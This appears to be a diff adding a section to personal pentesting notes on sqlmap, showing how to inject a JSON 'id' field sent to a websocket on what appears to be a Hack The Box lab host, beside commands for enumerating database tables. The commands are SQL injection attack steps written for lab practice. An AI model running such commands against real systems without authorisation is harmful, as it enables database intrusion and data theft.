@@ -77,6 +77,15 @@ Then pick a db and enum the tables
 
 	sqlmap -r <> --batch --dbms=<> -D <db_name> --tables
 
+## Sqlmap and websockets
+
+Let's say that there is a websocket running on ws://soc-player.soccer.htb:9091/, and to this endpoint we send a json data of {"id":"1000"}, we can use sqlmap to inject the id parameter.
+
+```
+sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"} --batch
+```
+
+
 ## More Information
 
 https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
